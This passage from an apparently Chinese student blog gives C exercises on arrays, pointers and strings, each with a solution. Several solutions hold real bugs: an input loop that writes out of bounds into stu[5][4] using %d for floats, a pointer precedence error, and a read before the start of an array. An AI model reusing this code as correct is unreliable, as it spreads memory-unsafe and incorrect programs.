class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//比较每列的数</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">t = num[i][<span class="number">0</span>];</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//flag用于确认有无最小值eg:(1,1,1,1)</span></span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[i][j] &lt; t)</span><br><span class="line">&#123;</span><br><span class="line">t = num[i][j];</span><br><span class="line">index=j;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//将num中最小值所在位置对应于end的数加一</span></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">end</span>[i][index]++;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//比较每行的数</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">&#123;</span><br><span class="line">t = num[<span class="number">0</span>][j];</span><br><span class="line">        index=<span class="number">0</span>;</span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[i][j] &gt; t)</span><br><span class="line">&#123;</span><br><span class="line">t = num[i][j];</span><br><span class="line">index = i;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将num中最大值所在位置对应于end的数加一,也就是说end中为2的位置就是num的马鞍点</span></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">end</span>[index][j]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里flag用于判断有无马鞍点</span></span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">end</span>[i][j] == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d"</span>, i, j, num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="指针练习"><a href="#指针练习" class="headerlink" title="指针练习"></a>指针练习</h2><h3 id="成绩处理"><a href="#成绩处理" class="headerlink" title="成绩处理"></a>成绩处理</h3><p>描述<br>输入5个学生，4门课成绩，二维数组stu表示，行标表示学生，列标表示课程成绩.</p><p>使用指针完成地址传递，主函数完成数组输入和输出。</p><p>分别编写函数aver()、fals()和well()完成：</p><ul><li><p>求第一门课的平均分；</p></li><li><p>统计有2门以上课程不及格的同学人数；</p></li><li><p>平均成绩在90分以上或者全部课程成绩在85分以上的同学视为优秀，统计人数，</p></li></ul><p>输入说明<br>输入二维浮点型数组stu</p><p>输出说明<br>输出第一门课程平均分(保留1位小数)、2门以上不及格人数和成绩优秀人数，数据之间空一格。</p><p>输入样例<br>85 73 59 92<br>93 95 89 88<br>86 88 88 87<br>59 51 52 68<br>78 32 59 91</p><p>输出样例<br>80.2 2 2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> stu[<span class="number">5</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">aver</span><span class="params">(<span class="keyword">float</span> (*n)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fals</span><span class="params">(<span class="keyword">float</span> (*n)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">well</span><span class="params">(<span class="keyword">float</span> (*n)[<span class="number">4</span>])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二维数组输入 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;stu[<span class="number">5</span>][<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.1f %d %d"</span>,aver(stu),fals(stu),well(stu));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*n)[列数]是二维数组传参形式</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">aver</span><span class="params">(<span class="keyword">float</span> (*n)[<span class="number">4</span>] )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">//sum为总分,av为平均分 </span></span><br><span class="line"><span class="keyword">float</span> sum=<span class="number">0</span>,av;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">sum += *(n + i)[<span class="number">0</span>];</span><br><span class="line">av = sum / <span class="number">5</span>;</span><br><span class="line"><span class="keyword">return</span> av;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fals</span><span class="params">(<span class="keyword">float</span>(*n)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//num为每个人低于60的个数,sum为人数 </span></span><br><span class="line"><span class="keyword">int</span> i, j, num = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">float</span>* p =&amp; n[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"><span class="comment">//用p++是考虑到二维数组在我们考虑来是二维的,但是在内存中是一个连续的空间储存的 </span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*p &lt; <span class="number">60</span>)</span><br><span class="line">num++;</span><br><span class="line">p++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (num &gt;= <span class="number">2</span>)</span><br><span class="line">sum++;</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">well</span><span class="params">(<span class="keyword">float</span>(*n)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//num是每人大于85的个数,sum是每人的总分,end是符合条件的人数 </span></span><br><span class="line"><span class="keyword">int</span> i, j, num = <span class="number">0</span>, sum = <span class="number">0</span>,<span class="built_in">end</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">float</span>* p = &amp;n[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">sum += *p;</span><br><span class="line"><span class="keyword">if</span> (*p &gt;= <span class="number">85</span>)</span><br><span class="line">num++;</span><br><span class="line">p++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sum &gt;= <span class="number">360</span> || num == <span class="number">4</span>)</span><br><span class="line"><span class="built_in">end</span>++;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="元素放置"><a href="#元素放置" class="headerlink" title="元素放置"></a>元素放置</h3><p>描述</p><ul><li><p>定义一个一维整形数组num[50]，输入正整数m、n（2≤m≤n≤7），输入一个m*n整形矩阵（值小于100）</p></li><li><p>编写函数place()完成矩阵元素S型放置，从小到大排列</p></li><li><p>使用指针完成地址传递，主函数完成数组输入和输出。</p></li></ul><p>输入说明<br>输入正整数m和n（2≤m≤n≤7），输入一个m*n整形矩阵，含m*n个元素（值小于100）。</p><p>输出说明<br>格式输出：按行输出处理后的矩阵，S型排列，%3d，每行换行，最后一行不换行。</p><p>输入样例<br>3 3</p><p>15 14 21 34 22 37 40 16 50</p><p>输出样例<br> 16 15 14<br> 21 22 34<br> 50 40 37</p><p>提示<br>使用指针作形参，实现地址传递，S型排列，%3d，每行换行，最后一行不换行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m, num[<span class="number">50</span>],s[<span class="number">7</span>][<span class="number">7</span>], i, j;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n, <span class="keyword">int</span> m,<span class="keyword">int</span>(*s)[<span class="number">7</span>])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="comment">//虽然要求输入一个矩阵,但我觉得木的必要pia&gt;&lt;!</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n * m; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i]);</span><br><span class="line"></span><br><span class="line">sort(num, n * m);</span><br><span class="line">place(num, n, m, s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>, s[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//冒泡排序,因为觉得把排序和放置分开来会简单点,所以就用了两个函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[j] &gt; num[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = num[j];</span><br><span class="line">num[j] = num[j + <span class="number">1</span>];</span><br><span class="line">num[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//s型放置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span>(*s)[<span class="number">7</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">s[i][j] = *num++;<span class="comment">//*num++代表取值后,num的地址加一</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">s[i][j] = *num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符统计"><a href="#字符统计" class="headerlink" title="字符统计"></a>字符统计</h3><p>描述</p><ul><li><p>定义一个一维字符数组string[100]，输入一个字符串，含N个字符（N≤100）</p></li><li><p>定义一个整形数组num[5]，用于存放统计结果数据</p></li><li><p>编写函数count()统计字符串中大写字母、小写字母、空格、数字以及其他字符的个数</p></li><li><p>使用指针完成地址传递，主函数完成数组输入和统计结果输出。</p></li></ul><p>输入说明<br>输入一行字符串，100个以内。</p><p>输出说明<br>格式输出：输出大写字母、小写字母、空格、数字以及其他字符的个数信息，数据之间空一格。</p><p>输入样例<br>A 3cp &amp;! 91 tD M</p><p>输出样例<br>3 3 5 3 2</p><p>提示<br>使用指针作形参，实现地址传递，输出数据之间空一格。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;, i;</span><br><span class="line"><span class="comment">//void count1(char* s, int* n);</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count2</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span>* n)</span></span>;</span><br><span class="line"></span><br><span class="line">gets_s(<span class="built_in">string</span>, <span class="number">100</span>);</span><br><span class="line"><span class="comment">//count1(string,num);</span></span><br><span class="line">count2(<span class="built_in">string</span>, num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count1</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span>* n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isupper</span>(s[i]))</span><br><span class="line">n[<span class="number">0</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(s[i]))</span><br><span class="line">n[<span class="number">1</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(s[i]))</span><br><span class="line">n[<span class="number">2</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(s[i]))</span><br><span class="line">n[<span class="number">3</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">n[<span class="number">4</span>]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count2</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span>* n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span>* p = s;</span><br><span class="line"><span class="keyword">for</span> (; *p != <span class="string">'\0'</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isupper</span>(*p))</span><br><span class="line">n[<span class="number">0</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(*p))</span><br><span class="line">n[<span class="number">1</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(*p))</span><br><span class="line">n[<span class="number">2</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(*p))</span><br><span class="line">n[<span class="number">3</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">n[<span class="number">4</span>]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长单词的长度"><a href="#最长单词的长度" class="headerlink" title="最长单词的长度"></a>最长单词的长度</h3><p>描述</p><p>给定一个英文句子，统计这个句子中最长单词的长度，并在屏幕上输出。</p><p>输入说明</p><p>从键盘输入一个英文句子，句子中只含有英文字符和空格，句子以’.’结束。句子总长不超过100个字符。</p><p>输出说明</p><p>输出一个整数，表示这个句子中最长单词的长度。允许句子中有相同长度的单词。</p><table><thead><tr><th align="left">输入样例</th><th align="left">输出样例</th></tr></thead><tbody><tr><td align="left">I am a student.</td><td align="left">7</td></tr><tr><td align="left">The cat gets a job.</td><td align="left">4</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>],*p=s;</span><br><span class="line"><span class="keyword">int</span> num,<span class="built_in">max</span>;</span><br><span class="line">    </span><br><span class="line">gets_s(s, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">for</span> (num=<span class="number">0</span>,<span class="built_in">max</span>=<span class="number">0</span>; *(p<span class="number">-1</span>) != <span class="string">'.'</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*p != <span class="string">' '</span> &amp;&amp; *p != <span class="string">'.'</span>)</span><br><span class="line">num++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = (num &gt; <span class="built_in">max</span>) ? num : <span class="built_in">max</span>;</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, <span class="built_in">max</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断字符串是否是回文"><a href="#判断字符串是否是回文" class="headerlink" title="判断字符串是否是回文"></a>判断字符串是否是回文</h3><p>描述</p><p>给定一个字符串，判断该字符串是否是回文，并在屏幕上输出判断结果。如“abcba”即是回文。</p><p>输入说明</p><p>从键盘输入一个字符串，该字符串中字符可以是字母、数字和空格，字母区分大小写。字符串总长不超过100个字符。</p><p>输出说明</p><p>若该字符串是回文，则输出yes，否则输出no。</p><table><thead><tr><th>输入样例</th><th>输出样例</th></tr></thead><tbody><tr><td>abcba</td><td>yes</td></tr><tr><td>Abccba</td><td>no</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>], *p=s;</span><br><span class="line"><span class="keyword">int</span> i,len,flag;</span><br><span class="line">    </span><br><span class="line">gets_s(s, <span class="number">100</span>);</span><br><span class="line">len = <span class="built_in">strlen</span>(s) ;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,flag=<span class="number">1</span>; i &lt; len/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]!=s[len-i<span class="number">-1</span>])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"yes"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组加强练习"><a href="#数组加强练习" class="headerlink" title="数组加强练习"></a>数组加强练习</h2><h3 id="灰度直方图"><a href="#灰度直方图" class="headerlink" title="灰度直方图"></a>灰度直方图</h3><p>问题描述<br>一幅m×n的灰度图像可以用一个二维矩阵表示，矩阵中的每个元素表示对应像素的灰度值。<br>灰度直方图表示图像中具有每种灰度级的象素的个数，反映图像中每种灰度出现的频率。<br>假设图像灰度为16级（灰度值从0-15），现给出一个矩阵表示的灰度图像，输出各级灰度的像素个数。</p><p>输入说明<br>输入数据第一行为两个整数m 和n分别表示图像的宽度和高度（0&lt;=m,n&lt;=256），其后是n行数据，每行m个整数，分别表示图像各个像素的灰度值。</p><p>输出说明<br>输出n行数据，每行数据由两个整数组成，分别表示灰度级和该灰度级像素个数，整数之间用空格分隔，灰度级输出顺序为从低到高，<br>如果某灰度级像素个数为0，则不输出该灰度级的统计结果。</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">0</span> <span class="number">2</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br><span class="line"><span class="symbol">12 </span><span class="number">14</span> <span class="number">10</span> <span class="number">6</span> <span class="number">7</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">15</span> <span class="number">3</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span 